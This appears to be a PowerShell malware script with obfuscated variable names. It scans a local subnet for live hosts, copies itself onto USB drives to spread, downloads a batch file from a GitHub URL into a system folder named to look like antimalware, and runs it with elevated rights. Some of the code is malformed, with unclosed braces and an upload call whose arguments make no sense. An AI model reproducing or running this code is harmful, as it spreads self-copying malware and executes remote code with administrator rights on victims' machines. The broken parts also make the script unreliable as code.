$hn7 = "192.168.1."
$j34 = 1..254
$o77 = foreach ($ip in $j34) { $hn7 + $ip }
$j11 = $MyInvocation.MyCommand.Path
$k90 = $env:Startup + "softkitty99.vbs"
foreach ($ip in $o77) {
    if (Test-Connection $ip -Quiet) {
        $cx = New-Object Net.WebClient
        $cx.UploadFile($k90, $k90)
$cwd = Split-Path -Path $j11 -Parent
foreach ($drive in Get-PSDrive -PSProvider FileSystem) {
    if ($drive.Description -like "*USB*") {
        Copy-Item -Path $j11 -Destination "$($drive.Root):\$($MyInvocation.MyCommand.Name)"
    }
} 
$j4 = "https://github.com/kaosSec/kaosTools/raw/main/bat/justafriendlydolphin.bat"
$u7 = "$env:SystemRoot\Antimalware Service Executable\Malware-Scan.bat"
Invoke-WebRequest $j4 -OutFile $u7
Start-Process -FilePath $u7 -Verb RunAs
[System.Windows.Forms.MessageBox]::Show("shiet")
